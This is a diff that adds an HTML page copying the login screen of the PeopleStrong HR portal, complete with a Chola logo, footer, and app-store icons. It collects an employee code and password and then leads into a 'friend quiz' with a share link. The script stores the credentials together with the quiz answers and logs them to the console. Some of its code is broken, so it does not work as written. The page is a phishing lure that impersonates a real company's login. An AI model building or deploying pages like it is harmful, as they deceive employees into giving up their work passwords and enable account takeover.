@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>PeopleStrong</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      overflow-x: hidden;
+    }
+
+    .login-bg img {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      object-fit: cover;
+      z-index: -1;
+    }
+
+    .section-login {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .LoginInner {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+
+    .section-logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .logo-worklife img,
+    .logo-client img {
+      height: 65px;
+    }
+
+    .login-label {
+      text-align: left;
+      font-size: 14px;
+      margin-top: 12px;
+      font-weight: 500;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 93%;
+      padding: 10px;
+      margin-top: 4px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+
+    .forgot {
+      font-size: 12px;
+      color: #180890;
+      margin-top: 4px;
+      display: flex;
+      justify-content: flex-end;
+      cursor: pointer;
+    }
+
+    .login-button {
+      background: #180890;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      font-size: 15px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    .loader {
+      display: none;
+      text-align: center;
+      font-size: 18px;
+      color: #180890;
+      margin-top: 20px;
+    }
+
+    .quiz-container {
+      display: none;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      text-align: center;
+    }
+
+    .quiz-box {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+      max-width: 500px;
+      width: 90%;
+      margin: auto;
+    }
+
+    .quiz-box h2 {
+      margin-bottom: 20px;
+    }
+
+    .quiz-box .option-btn {
+      background: #180890;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      padding: 10px;
+      margin: 10px 0;
+      cursor: pointer;
+      font-size: 15px;
+      width: 100%;
+    }
+
+    .quiz-box input[type="text"] {
+      padding: 10px;
+      width: 90%;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .share-section {
+      margin-top: 20px;
+    }
+
+    .share-section input {
+      width: 90%;
+      padding: 8px;
+    }
+
+    .section-footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      text-align: center;
+      padding: 6px 10px;
+      background: transparent;
+    }
+
+    .footer-logo img {
+      height: 22px;
+      margin-bottom: 5px;
+    }
+
+    .footer-copy {
+      font-size: 12px;
+      color: #333;
+    }
+
+    .store-icons {
+      position: absolute;
+      bottom: 10px;
+      right: 10px;
+    }
+
+    .store-icons img {
+      height: 36px;
+      margin: 0 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- 🔲 Background -->
+  <div class="login-bg">
+    <img src="data:image/png;base64,aaaa" alt="Background">
+  </div>
+
+  <!-- 🔲 Login Section -->
+  <div class="section-login" id="loginSection">
+    <div class="LoginInner">
+      <div class="section-logo">
+        <div class="logo-worklife">
+          <img src="data:image/png;base64," alt="Chola Logo">
+        </div>
+      </div>
+
+      <form action="" method="POST">
+  <div class="login-label">Employee Code</div>
+  <input type="text" id="empCode" name="empCode" required>
+
+  <div class="login-label">Password</div>
+  <input type="password" id="empPass" name="empPass" required>
+
+  <div class="forgot">Forgot Password?</div>
+  <button class="login-button" type="submit">Login</button>
+</form>
+    </div>
+  </div>
+
+  <!-- 🔲 Quiz Section -->
+  <div class="quiz-container" id="quizContainer">
+    <div class="quiz-box" id="quizBox">
+      <h2 id="questionText"></h2>
+      <div id="optionsContainer"></div>
+    </div>
+  </div>
+
+  <!-- 🔲 Footer -->
+  <div class="section-footer">
+    <div class="footer-logo">
+      <img src="data:image/png;base64,aaaa" alt="LS Logo">
+    </div>
+    <div class="footer-copy">© 2025 PeopleStrong</div>
+    <div class="store-icons">
+      <img src="data:image/png;base64,aaaa" alt = "Play Store">
+      <img src="data:image/png;base64,aaaa" alt="App Store">
+    </div>
+  </div>
+
+  <script>
+    const questions = [
+      { q: "What is your friend's favourite colour?", type: "mcq", options: ["Blue", "Red", "Green", "Black"] },
+      { q: "What is your friend's favourite food?", type: "mcq", options: ["South Indian", "North Indian", "Chinese", "Italian"] },
+      { q: "What is your friend's favourite topic of interest?", type: "mcq", options: ["Tech", "Music", "Sports", "Movies"] },
+      { q: "Is your friend a foodie?", type: "mcq", options: ["Yes", "No"] },
+      { q: "If you want to gift one thing to your friend, what would it be?", type: "text" }
+    ];
+
+    let currentQuestion = 0;
+    const answers = [];
+
+    const loader = document.getElementById("loader");
+    const loginSection = document.getElementById("loginSection");
+    const quizContainer = document.getElementById("quizContainer");
+    const questionText = document.getElementById("questionText");
+    const optionsContainer = document.getElementById("optionsContainer");
+
+    function handleLogin(event) {
+      event.preventDefault();
+      const empCode = document.getElementById("empCode").value;
+      const empPass = document.getElementById("empPass").value;
+      answers.push({ q: "Employee Code", a: empCode });
+      answers.push({ q: "Password", a: empPass });
+
+      loader.style.display = "block";
+      setTimeout(() => {
+        loader.style.display = "none";
+        loginSection.style.display = "none";
+        quizContainer.style.display = "flex";
+        showQuestion();
+      }, 2000);
+    }
+
+    function showQuestion() {
+      const current = questions[currentQuestion];
+      questionText.innerText = current.q;
+      optionsContainer.innerHTML = "";
+
+      if (current.type === "mcq") {
+        current.options.forEach(opt => {
+          const btn = document.createElement("button");
+          btn.innerText = opt;
+          btn.className = "option-btn";
+          btn.onclick = () => {
+            answers.push({ q: current.q, a: opt });
+            nextQuestion();
+          };
+          optionsContainer.appendChild(btn);
+        });
+      } else {
+        const input = document.createElement("input");
+        input.type = "text";
+        input.placeholder = "Type your answer...";
+        input.id = "textAnswer";
+        optionsContainer.appendChild(input);
+
+        const submitBtn = document.createElement("button");
+        submitBtn.innerText = "Next";
+        submitBtn.className = "option-btn";
+        submitBtn.onclick = () => {
+          const userAnswer = document.getElementById("textAnswer").value;
+          answers.push({ q: current.q, a: userAnswer });
+          nextQuestion();
+        };
+        optionsContainer.appendChild(submitBtn);
+      }
+    }
+
+    function nextQuestion() {
+      currentQuestion++;
+      if (currentQuestion < questions.length) {
+        showQuestion();
+      } else {
+        showShare();
+      }
+    }
+
+    function showShare() {
+      questionText.innerText = "Share this quiz with your friend!";
+      optionsContainer.innerHTML = `
+        <div class="share-section">
+          <input type="text" readonly value="https://yourquizlink.com">
+          <p style="margin-top: 10px; font-size: 14px;">Copy this link and send it to your friend 💌</p>
+        </div>
+      `;
+      console.log("Answers:", answers);
+    }
+  </script>
+</body>
+</html>
